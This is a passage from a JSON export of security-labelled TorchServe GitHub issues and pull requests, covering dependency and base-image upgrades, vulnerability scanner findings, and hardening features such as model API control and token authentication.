/home/model-server/model-store                                                                 0.4s \r\n => [runtime-image 9/9] WORKDIR /home/model-server                                                                                                                                       0.0s \r\n => exporting to image                                                                                                                                                                  20.2s\r\n => => exporting layers                                                                                                                                                                 20.1s\r\n => => writing image sha256:e644d414385932c08844d932e1602b2de2d5eada8f4f8d0936bd478fe8e42b3f                                                                                             0.0s\r\n => => naming to docker.io/marksaroufim/torchserve:gpu-prod  \r\n```",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-12T18:31:39Z",
                        "url": "https://github.com/pytorch/serve/pull/2064#issuecomment-1380838118"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2064",
                    "merged_at": "2023-01-17T21:21:07Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2063",
                "title": "Remove dependency on future",
                "labels": [
                    "triaged",
                    "security"
                ],
                "user": "AndreasBergmeier6176",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2063,
                "id": 1525683148,
                "state": "closed",
                "project_created_at": "2023-01-09T14:19:40Z",
                "closed_at": "2023-01-24T01:18:34Z",
                "body": "### 🐛 Describe the bug\n\nThere is an advisory due to the future package: https://github.com/advisories/GHSA-v3c5-jqr6-7qm8\r\nIt seems to me like the _future_ package serves no purpose anymore. See discussion in https://github.com/PythonCharmers/python-future/issues/612.\r\nIs it possible to solve the security problem by just removing the dependency on future and doing a new serve release?\r\n\r\nIn our project executing `poetry show --tree --why future` we get the output:\r\n```\r\ntorchserve 0.6.1 TorchServe is a tool for serving neural net models for inference\r\n└── future *\r\n```\n\n### Error logs\n\nSee above links.\n\n### Installation instructions\n\npoetry\n\n### Model Packaing\n\nNA\n\n### config.properties\n\nNA\n\n### Versions\n\n0.6.1\n\n### Repro instructions\n\nNA\n\n### Possible Solution\n\nPerhaps remove `future` line from dependencies.",
                "comments": [
                    {
                        "body": "Yeah this makes sense, we are doing a security centric release next so this is timely",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-09T23:17:33Z",
                        "url": "https://github.com/pytorch/serve/issues/2063#issuecomment-1376475692"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2056",
                "title": "Upgrade to PyTorch 1.13.1",
                "labels": [
                    "p0",
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2056,
                "id": 1519153991,
                "state": "closed",
                "project_created_at": "2023-01-04T15:18:36Z",
                "closed_at": "2023-01-19T18:20:14Z",
                "body": "### 🚀 The feature\r\n\r\nPyTorch 1.13.1 has fixed a critical vulnerability with remote code execution. We currently have 17 such critical alerts from dependabot\r\n\r\nThis also means it's a good time to deprecate older versions of torch and potentially significantly cut down on the number of requirements.txt we need to support \r\n\r\nI don't believe running a comprehensive benchmark suite should block merging such a change since it's a patch release and security is more important than performance however it might be a good opportunity to automate everything about our benchmark suite\r\n\r\n### Motivation, pitch\r\n\r\nn\r\n\r\n### Alternatives\r\n\r\n_No response_\r\n\r\n### Additional context\r\n\r\n_No response_",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2042",
                "title": "Docker 0.7 Security issues ",
                "labels": [
                    "triaged",
                    "p0",
                    "security"
                ],
                "user": "jack-gits",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2042,
                "id": 1506101217,
                "state": "closed",
                "project_created_at": "2022-12-21T10:47:35Z",
                "closed_at": "2023-01-18T23:03:02Z",
                "body": "### 🐛 Describe the bug\n\nwe found some security issues base of 0.7.0 release.\r\n\r\nbelow is the founds:\r\n![image](https://user-images.githubusercontent.com/30545972/208887170-07dd835a-46cd-4b04-b777-748f292a3e3d.png)\n\n### Error logs\n\n\r\nNone\n\n### Installation instructions\n\nFROM pytorch/torchserve:0.7.0-gpu\n\n### Model Packaing\n\nFROM pytorch/torchserve:0.7.0-gpu\n\n### config.properties\n\n_No response_\n\n### Versions\n\n0.7.0\n\n### Repro instructions\n\nNone\n\n### Possible Solution\n\n_No response_",
                "comments": [
                    {
                        "body": "Which tool are you using to find these vulnerabilities? docker scan?\r\n\r\nFor the 0.7 release we looked at issues highlighted by\r\n* https://deps.dev/pypi/torchserve\r\n* https://github.com/pytorch/serve/security/dependabot\r\n\r\nHappy to track more",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-12-21T18:37:27Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1361855781"
                    },
                    {
                        "body": "@msaroufim we're using AQUA CLOUD NATIVE.\r\n\r\nby the way, I can't open https://github.com/pytorch/serve/security/dependabot",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-12-22T02:58:00Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1362341797"
                    },
                    {
                        "body": "@msaroufim do you have plan to fix these security issues?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-12-27T02:56:26Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1365570580"
                    },
                    {
                        "body": "Yeah but I'm on PTO and so is most of the team until the first week of January. Will find an owner then ",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-12-27T08:43:27Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1365717803"
                    },
                    {
                        "body": "I just enabled docker security scanning on dockerhub and should have the first report by tomorrow's nighlies\r\n\r\nEDIT: idk why it took half a day to enable scanning on dockerhub, scan should happen by tommorrow's nightlies so Jan 5 PST\r\n\r\nEDIT: OK it works! Most of the issues seem to be related to just using Ubuntu 20.04 and we should instead upgrade to ubuntu:rolling, working now on enabling automatic issue fixing with Snyk",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-03T21:35:00Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1370247299"
                    },
                    {
                        "body": "Can be fixed in next release or an urgent patch? ",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-09T08:11:06Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1375243192"
                    },
                    {
                        "body": "I'm not sure what the exit criteria would be since we don't use AQUA CLOUD NATIVE. I just enabled Snyk support and it looks like a large chunk of issues go away if we just use `ubuntu:rolling` instead, is that sufficient for you for now? #2064 #2065 #2066\r\n\r\nThese are all the security issues I'm tracking for next release https://github.com/pytorch/serve/issues?q=is%3Aissue+is%3Aopen+label%3Asecurity if there's anything more specific that we have to fix",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-10T00:00:21Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1376512958"
                    },
                    {
                        "body": "can you provide a docker image base on ubuntu:rolling now? I can help test it by AQUA CLOUD NATIVE.",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-10T10:46:29Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1377063545"
                    },
                    {
                        "body": "@msaroufim is it possible to provide a temporary docker image for security scanning?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-12T05:24:48Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1379830546"
                    },
                    {
                        "body": "Pushed it here for you https://hub.docker.com/repository/docker/marksaroufim/torchserve/general it's the latest GPU image\r\n\r\nJust for reference you can build our docker images locally, this is the exact command we use for our nightlies \r\n\r\nhttps://github.com/pytorch/serve/blob/master/docker/docker_nightly.py#L37\r\n\r\nwith the full instructions here https://github.com/pytorch/serve/tree/master/docker\r\n\r\nSo for example in this case I ran \r\n\r\n```\r\n./build_image.sh -bt dev -b snyk-fix-e1077ba036875975fd0ab47e0f5bffb7 -g -cv cu117 -t marksaroufim/torchserve:gpu-latest\r\n```\r\n\r\nSo feel free to test this but in the future it might be more efficient for you to build locally, run whatever tests you like and then open up a PR if you see any issues",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-12T18:03:45Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1380796673"
                    },
                    {
                        "body": "great, thanks.",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-14T01:59:35Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1382631775"
                    },
                    {
                        "body": "Next nightlies should be using ubuntu:rolling https://github.com/pytorch/serve/pull/2065",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-17T19:04:06Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1385912609"
                    },
                    {
                        "body": "@msaroufim \r\nI'm trying to fix the security issues and PR. https://github.com/pytorch/serve/pull/2081\r\n\r\n",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-18T16:02:41Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1387311765"
                    },
                    {
                        "body": "There're still many security issues, for example linux-libc-dev, I have no idea how to fix it.\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/213394268-22f0e378-a840-4d29-8a45-7cd709d182c5.png)\r\n",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-19T08:39:34Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1396619246"
                    },
                    {
                        "body": "@msaroufim any suggestion?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-30T01:50:17Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1407868412"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/1971",
                "title": "security issue",
                "labels": [
                    "triaged",
                    "dependencies",
                    "security"
                ],
                "user": "jack-gits",
                "issue_author_association": "CONTRIBUTOR",
                "number": 1971,
                "id": 1447883775,
                "state": "closed",
                "project_created_at": "2022-11-14T11:25:02Z",
                "closed_at": "2022-11-17T20:16:02Z",
                "body": "### 🐛 Describe the bug\n\nI found some security issues on pytorch/torchserve:0.6.0-gpu\r\n\r\nsecurity issues as below. \r\nwhether the torchseve support ubuntu 19.04? how to upgrade the os?\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/201647738-cf3b5526-5277-4401-b928-86b5e954dcb5.png)\r\n\n\n### Error logs\n\n![Uploading image.png…]()\r\n\n\n### Installation instructions\n\nFROM pytorch/torchserve:0.6.0-gpu\n\n### Model Packaing\n\nFROM pytorch/torchserve:0.6.0-gpu\n\n### config.properties\n\n_No response_\n\n### Versions\n\nFROM pytorch/torchserve:0.6.0-gpu\n\n### Repro instructions\n\nFROM pytorch/torchserve:0.6.0-gpu\n\n### Possible Solution\n\n_No response_",
                "comments": [
                    {
                        "body": "We'll likely soon do a patch release where we upgrade the default to Ubuntu 20.04",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-14T15:15:30Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1313913776"
                    },
                    {
                        "body": "when the patch can be released?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-14T16:30:22Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1314033944"
                    },
                    {
                        "body": "when the patch can be released?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-14T16:30:55Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1314034651"
                    },
                    {
                        "body": "Team is focused on 0.6.1 release today, if that goes smoothly then we can discuss a patch release sometime before Dec 15 but need to confirm with rest of team first",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-14T16:39:30Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1314052961"
                    },
                    {
                        "body": "thanks for your information.  \r\nI'm really looking forward to this patch.",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-15T10:06:20Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1315078669"
                    },
                    {
                        "body": "@msaroufim  how to get the docker image of this patch? ",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-19T14:01:59Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1320892094"
                    },
                    {
                        "body": "use build_image.sh to build the image myself?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-19T14:13:27Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1320894345"
                    },
                    {
                        "body": "For now yes but we will make a release in early December for you to get an official release ",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-19T14:26:34Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1320896959"
                    },
                    {
                        "body": "got it. thanks",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-19T15:12:04Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1320905277"
                    },
                    {
                        "body": "Ah the nightly docker images should work too",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-19T16:10:15Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1320916032"
                    },
                    {
                        "body": "@msaroufim \r\nI found the linux version is still ubuntu16.04; below is the information:\r\n\r\n**_docker run nvidia/cuda:11.6.0-cudnn8-runtime-ubuntu20.04_**\r\ncat /proc/version\r\nLinux version 4.4.0-1128-aws (buildd@lcy01-amd64-029) (gcc version 5.4.0 20160609 (**_Ubuntu 5.4.0-6ubuntu1~16.04.12_**) ) #142-Ubuntu SMP Fri Apr 16 12:42:33 UTC 2021\r\n\r\nbut gcc version is 20.04\r\n\r\n**_gcc -v_**\r\n\r\nUsing built-in specs.\r\nCOLLECT_GCC=gcc\r\nCOLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/9/lto-wrapper\r\nOFFLOAD_TARGET_NAMES=nvptx-none:hsa\r\nOFFLOAD_TARGET_DEFAULT=1\r\nTarget: x86_64-linux-gnu\r\nConfigured with: ../src/configure -v --with-pkgversion='Ubuntu 9.4.0-1 ubuntu1~ 20.04.1' --with-bugurl=file:///usr/share/doc/gcc-9/README.Bugs --enable-languages=c,ada,c++,go,brig,d,fortran,objc,obj-c++,gm2 --prefix=/usr --with-gcc-major-version-only --program-suffix=-9 --program-prefix=x86_64-linux-gnu- --enable-shared --enable-linker-build-id --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --libdir=/usr/lib --enable-nls --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --with-default-libstdcxx-abi=new --enable-gnu-unique-object --disable-vtable-verify --enable-plugin --enable-default-pie --with-system-zlib --with-target-system-zlib=auto --enable-objc-gc=auto --enable-multiarch --disable-werror --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-offload-targets=nvptx-none=/build/gcc-9-Av3uEd/gcc-9-9.4.0/debian/tmp-nvptx/usr,hsa --without-cuda-driver --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu\r\nThread model: posix\r\n**_gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)_** \r\n\r\n",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-19T19:55:10Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1320957441"
                    },
                    {
                        "body": "another issue:\r\nduring registering my model, I run the check , but it failed and raised an error \"CUBLAS_STATUS_INVALID_VALUE\".\r\n```\r\n`2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/model-server/tmp/models/fb396cbe11634159a8d30eea322582cb/inference-handler.py\", line 32, in __init__\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     paddle.utils.run_check()\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/venv/lib/python3.8/site-packages/paddle/utils/install_check.py\", line 266, in run_check\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     _run_static_single(use_cuda, use_xpu, use_npu)\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/venv/lib/python3.8/site-packages/paddle/utils/install_check.py\", line 171, in _run_static_single\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     exe.run(train_prog,\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/venv/lib/python3.8/site-packages/paddle/fluid/executor.py\", line 1299, in run\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     six.reraise(*sys.exc_info())\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/venv/lib/python3.8/site-packages/six.py\", line 719, in reraise\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     raise value\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/venv/lib/python3.8/site-packages/paddle/fluid/executor.py\", line 1285, in run\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     res = self._run_impl(\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/venv/lib/python3.8/site-packages/paddle/fluid/executor.py\", line 1464, in _run_impl\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     return new_exe.run(list(feed.keys()), fetch_list, return_numpy)\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/venv/lib/python3.8/site-packages/paddle/fluid/executor.py\", line 547, in run\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     tensors = self._new_exe.run(feed_names, fetch_list)._move_to_list()\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG - OSError: (External) CUBLAS error(7). \r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   [Hint: 'CUBLAS_STATUS_INVALID_VALUE'.  An unsupported value or parameter was passed to the function (a negative vector size, for example). To correct: ensure that all the parameters being passed have valid values. ] (at /paddle/paddle/phi/kernels/funcs/blas/blas_impl.cu.h:35)\r\n```\r\n`\r\nbut when I login the docker and run the check by command line, the check passed.\r\n```\r\n`>>> import paddle\r\n>>> paddle.utils.run_check()\r\nRunning verify PaddlePaddle program ... \r\npaddle.is_compiled_with_cuda() True\r\nuse_cuda True\r\nfetch_list ['sum_0.tmp_0', 'create_parameter_0.w_0@GRAD']\r\nfeed_names ['input']\r\nPaddlePaddle works well on 1 GPU.\r\nPaddlePaddle works well on 1 GPUs.\r\nPaddlePaddle is installed successfully! Let's start deep learning with PaddlePaddle now.\r\n>>> `\r\n```\r\n",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-20T13:53:28Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1321138794"
                    },
                    {
                        "body": "Do you have a repro you could share? Cc @agunapal ",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-20T16:50:10Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1321181592"
                    },
                    {
                        "body": "when I checked the docker history, I found libcublas(version: 11.8.1.74-1 ) is used for cuda11.6. I'm not sure whether it's the  reason.\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/202952808-5830b253-ef1e-4c83-9da1-61ada1a1282b.png)\r\n",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-21T02:50:15Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1321383526"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/1860",
                "title": "torchserve-kfs docker image upgrade to kserve v0.9.0",
                "labels": [
                    "triaged",
                    "kubernetes",
                    "p0",
                    "security"
                ],
                "user": "mansigoel",
                "issue_author_association": "NONE",
                "number": 1860,
                "id": 1371646274,
                "state": "closed",
                "project_created_at": "2022-09-13T15:34:00Z",
                "closed_at": "2022-11-29T01:27:45Z",
                "body": "Kserve v0.9.0 release fixes log4j security vulnerability issue: https://github.com/kserve/kserve/releases/tag/v0.9.0 \r\ntorchserve-kfs 0.6.0 docker image currently uses kserve v0.8.0\r\nCan we please upgrade the kserve version and release a new version of torchserve-kfs docker image to address the log4j vulnerability issue?\r\n",
                "comments": [
                    {
                        "body": "@jagadeeshi2i were you planning on taking a look at this? We can include it by our next patch release in early december",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-15T16:56:21Z",
                        "url": "https://github.com/pytorch/serve/issues/1860#issuecomment-1315601540"
                    },
                    {
                        "body": "Sure @msaroufim will bump the kserve version. ",
                        "user": "jagadeeshi2i",
                        "issue_author_association": "COLLABORATOR",
                        "project_created_at": "2022-11-15T16:59:13Z",
                        "url": "https://github.com/pytorch/serve/issues/1860#issuecomment-1315605521"
                    }
                ],
                "pull_request": null
            }
        ],
        "SecurityPolicy_reporting_mechanism": "email_external",
        "num_security_issues_after_policy": 34,
        "num_security_issue_and_pull": 34,
        "security_issues_created_after_policy": [
            {
                "url": "https://github.com/pytorch/serve/issues/3158",
                "title": "Support \"model-control-mode\" in configuration",
                "labels": [
                    "enhancement",
                    "p0",
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 3158,
                "id": 2311717873,
                "state": "closed",
                "project_created_at": "2024-05-23T00:37:13Z",
                "closed_at": "2024-06-11T18:28:31Z",
                "body": "### 🚀 The feature\n\n- Support model-control-mode:\r\n1. none:  Models are loaded at start up and can not be modified. (default).\r\n2. explicit: Models can be loaded and unloaded via the model load APIs.\r\n\r\n- Support model-control-mode is configurable via config.properties \n\n### Motivation, pitch\n\nFor security reason, it is important to prevent malicious code is uploaded in model server.\n\n### Alternatives\n\n_No response_\n\n### Additional context\n\n_No response_",
                "comments": [
                    {
                        "body": "Model API control has been added. Default is model API disabled preventing registering and deleting models once TorchServe starts. ",
                        "user": "udaij12",
                        "issue_author_association": "COLLABORATOR",
                        "project_created_at": "2024-06-11T18:28:31Z",
                        "url": "https://github.com/pytorch/serve/issues/3158#issuecomment-2161370837"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/3157",
                "title": "Enable token authentication as default",
                "labels": [
                    "enhancement",
                    "p0",
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 3157,
                "id": 2311697127,
                "state": "open",
                "project_created_at": "2024-05-23T00:19:41Z",
                "closed_at": null,
                "body": "### 🚀 The feature\n\n- By default, enable plugin token authentication.\r\n- Allow cx to disable token authentication via config.properties.\n\n### Motivation, pitch\n\nCurrent token authentication is enabled via option \"--plugins-path /path/to/the/jar/files\".\n\n### Alternatives\n\n_No response_\n\n### Additional context\n\n_No response_",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/3065",
                "title": "improve security doc for model security check ",
                "labels": [
                    "documentation",
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 3065,
                "id": 2221260097,
                "state": "closed",
                "project_created_at": "2024-04-02T19:14:36Z",
                "closed_at": "2024-04-17T18:25:41Z",
                "body": "### 📚 The doc issue\n\nThe model url provided by cx potentially can contain unsafe content. Existing security lacks the summary of guidance to cx to overcome this issue.\n\n### Suggest a potential alternative/fix\n\nTorchServe provides 3 different levels security check to address this issue. TorchServe Security doc can be updated to provide guidance for cx.\r\n- option1: allowed urls\r\n- option2: cx plugin is a flexible solution which allows cx to add the security check they prefer. \r\n- option3: prod infra (cloud service or internal company infra) provide AOT security check.",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2787",
                "title": "Update Huggingface_Transformers examples for safetensors",
                "labels": [
                    "triaged",
                    "security"
                ],
                "user": "nathanweeks",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2787,
                "id": 1989527525,
                "state": "open",
                "project_created_at": "2023-11-12T19:01:27Z",
                "closed_at": null,
                "body": "### 📚 The doc issue\n\nIn examples/Huggingface_Transformers/README.md, the `torch-model-archiver` commands specify `--serialized-file Transformer_model/pytorch_model.bin` option-arguments. However, the `Download_Transformer_models.py` script in the same directory currently results in a downloaded model in the safetensors format: \r\n\r\n```\r\n$ python Download_Transformer_models.py\r\n...\r\nSave model and tokenizer/ Torchscript model based on the setting from setup_config bert-base-uncased in directory ./Transformer_model\r\n$ ls -1 Transformer_model/\r\nconfig.json\r\nmodel.safetensors\r\nspecial_tokens_map.json\r\ntokenizer_config.json\r\ntokenizer.json\r\nvocab.txt\r\n```\n\n### Suggest a potential alternative/fix\n\nPerhaps update the examples to accommodate both formats.",
                "comments": [
                    {
                        "body": "Makes sense, @HamidShojanazeri @mreso is one of you interested in this?",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-12T23:10:26Z",
                        "url": "https://github.com/pytorch/serve/issues/2787#issuecomment-1807275099"
                    },
                    {
                        "body": "How do you manage to solve this? I still don't know how torch-model-archiver works with safetensors.",
                        "user": "yolk-pie-L",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-03-14T06:44:57Z",
                        "url": "https://github.com/pytorch/serve/issues/2787#issuecomment-1996629669"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2685",
                "title": "push down url validation to avoid security check false alarm",
                "labels": [
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 2685,
                "id": 1929160730,
                "state": "closed",
                "project_created_at": "2023-10-05T22:21:38Z",
                "closed_at": "2023-10-09T22:26:24Z",
                "body": "## Description\r\n\r\nPlease read our [CONTRIBUTING.md](https://github.com/pytorch/serve/blob/master/CONTRIBUTING.md) prior to creating your first pull request.\r\n\r\nPlease include a summary of the feature or issue being fixed. Please also include relevant motivation and context. List any dependencies that are required for this change.\r\n\r\nThe url validation is already done before we use the url. There is false security alarm b/c security check lost the context. To avoid the false alarm, we push down url validation.\r\n\r\nFixing:\r\n1. disable loading TS_ALLOWED_URLS from env\r\n2. move url validation close to \"new URL(url)\" to clearly show security false positive\"\r\n3. sanity check archiveName to guard Uncontrolled data used in path expression\r\n\r\nFixes #(issue)\r\n#2665 \r\n\r\n## Type of change\r\n\r\nPlease delete options that are not relevant.\r\n\r\n- [X] Bug fix (non-breaking change which fixes an issue)\r\n- [ ] Breaking change (fix or feature that would cause existing functionality to not work as expected)\r\n- [ ] New feature (non-breaking change which adds functionality)\r\n- [ ] This change requires a documentation update\r\n\r\n## Feature/Issue validation/testing\r\n\r\nPlease describe the Unit or Integration tests that you ran to verify your changes and relevant result summary. Provide instructions so it can be reproduced.\r\nPlease also list any relevant details for your test configuration.\r\n\r\n- [ ] Test A\r\nLogs for Test A\r\n\r\n- [ ] Test B\r\nLogs for Test B\r\n\r\n\r\n## Checklist:\r\n\r\n- [ ] Did you have fun?\r\n- [ ] Have you added tests that prove your fix is effective or that this feature works?\r\n- [ ] Has code been commented, particularly in hard-to-understand areas?\r\n- [ ] Have you made corresponding changes to the documentation?",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2685?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2685](https://app.codecov.io/gh/pytorch/serve/pull/2685?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (941171a) into [master](https://app.codecov.io/gh/pytorch/serve/commit/f57240fc14ee088d5355bf5f498b49b8ab987dd2?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (f57240f) will **not change** coverage.\n> Report is 1 commits behind head on master.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 941171a differs from pull request most recent head 378dd50. Consider uploading reports for the commit 378dd50 to get more accurate results\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2685   +/-   ##\n=======================================\n  Coverage   72.39%   72.39%           \n=======================================\n  Files          85       85           \n  Lines        3956     3956           \n  Branches       58       58           \n=======================================\n  Hits         2864     2864           \n  Misses       1088     1088           \n  Partials        4        4           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn 